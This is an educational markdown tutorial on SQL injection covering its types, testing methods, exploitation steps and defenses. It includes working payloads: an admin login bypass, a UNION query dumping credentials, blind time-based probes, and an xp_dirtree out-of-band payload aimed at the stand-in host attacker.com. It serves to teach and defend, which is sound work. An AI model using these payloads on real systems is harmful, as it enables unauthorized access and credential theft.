# SQL Injection

## Table Of Contents

- [What Is SQL Injection](#what-is-sql-injection)
- [How To Find SQL Injection Vulnerabilities](#how-to-find-sql-injection-vulnerabilities)
- [How To Exploit SQL Injection Vulnerabilities](#how-to-exploit-sql-injection-vulnerabilities)
- [How To Prevent SQL Injection Vulnerabilities](#how-to-prevent-sql-injection-vulnerabilities)

---

## What Is SQL Injection?

SQL Injection is a vulnerability that allows an attacker to interfere with the SQL queries an application makes to a database.

#### Example:
1. User Input:

`Username: admin'-- Password: (leave blank)`

2. Backend Query:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = '';
```

3. Result: 
   * Attacker gains unauthorized access as the admin user.

### Impact of SQL Injection Attacks

- **Confidentiality**: SQLi can expose sensitive information, such as usernames and passwords.
- **Integrity**: SQLi can alter database data.
- **Availability**: SQLi can delete or modify data, impacting application functionality.
- **Remote Code Execution**: SQLi can execute commands on the operating system.

---

### Types of SQL Injection

1. **In-Band (Classic)**

   - **Error-Based SQLi**:
     Exploits database error messages to gain information.  
     **Example**:
     ```vbnet
     Input: www.example.com/app.php?id='
     Output: Error: "You have an error in your SQL syntax..."
     ```

   - **Union-Based SQLi**:
     Combines the results of two queries using the `UNION` SQL operator.  
     **Example**:
     ```vbnet
     Input: www.example.com/app.php?id=' UNION SELECT username, password FROM users--
     Output:
     admin / password123  
     user / password456
     ```

2. **Inferential (Blind)**

   - **Boolean-Based SQLi**:
     Exploits differences in application responses based on TRUE or FALSE conditions.  
     **Example**:
     ```python
     Payload: id=1 AND 1=1 (True)
     Payload: id=1 AND 1=2 (False)
     ```

   - **Time-Based SQLi**:
     Relies on database delays to infer information.  
     **Example**:
     ```css
     Payload: id=1 AND IF(SUBSTRING(password, 1, 1)='a', SLEEP(5), 0)
     ```

3. **Out-of-Band (OAST)**

   - Exploits out-of-band channels, such as DNS or HTTP, to exfiltrate data.  
     **Example**:
     ```arduino
     Payload: '; exec master..xp_dirtree '//attacker.com/a'--
     ```

---

## How to Find SQL Injection Vulnerabilities

### Black-Box Testing
- Map the application and test its inputs.
- Submit SQL-specific payloads such as `'` or `"` and look for errors.
- Submit Boolean conditions like `OR 1=1` or `OR 1=2` to observe differences in responses.
- Use time-delay payloads to test for Time-Based SQLi.
- Submit out-of-band payloads to monitor for external network interactions.

### White-Box Testing
- Enable web server and database logging.
- Perform a regex search for database queries in the code.
- Review all input points in the application code for potential SQLi vulnerabilities.
- Ensure proper input validation and query parameterization.

---

## How to Exploit SQL Injection Vulnerabilities

### Exploiting Error-Based SQLi
- Submit SQL-specific characters like `'` or `"` and observe error messages.
- Use the information revealed in errors to refine the payload.

### Exploiting Union-Based SQLi
1. Determine the number of columns using `ORDER BY` or `NULL` payloads:

   ```sql
   Input: UNION SELECT NULL--
   Input: UNION SELECT NULL, NULL--
   ```

2. Identify columns with useful data types by injecting strings into each column:
`Payload: UNION SELECT 'test', NULL--`

3. Extract data by combining results with the UNION operator.

### Exploiting Boolean-Based SQLi

Submit payloads with Boolean conditions to observe responses:

```sql
Input: id=1 AND 1=1 (True)
Input: id=1 AND 1=2 (False)
```

### Exploiting Time-Based SQLi

Use payloads that delay responses:

```sql
Input: id=1 AND IF(SUBSTRING(password, 1, 1)='a', SLEEP(5), 0)
```

### Exploiting Out-of-Band SQLi

Submit payloads to trigger out-of-band interactions:

```sql
Payload: '; exec master..xp_dirtree '//attacker.com/a'--
```
## How to Prevent SQL Injection Vulnerabilities

### Primary Defenses

1. **Prepared Statements (Parameterized Queries)**:
   - Use placeholders for user inputs instead of directly embedding them into queries.

2. **Stored Procedures**:
   - Use parameterized stored procedures for database interactions.

3. **Whitelist Input Validation**:
   - Define and enforce valid input formats.

4. **Escaping User Input**:
   - Escape special characters in user inputs as a last resort.

---

### Additional Defenses

1. **Enforce Least Privilege**:
   - Restrict database user permissions to only what is necessary.

2. **Database Hardening**:
   - Apply CIS benchmarks and security patches.

3. **Input Validation**:
   - Validate user inputs against a strict whitelist.

---

## Resources

- [Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP - SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PentestMonkey - SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)

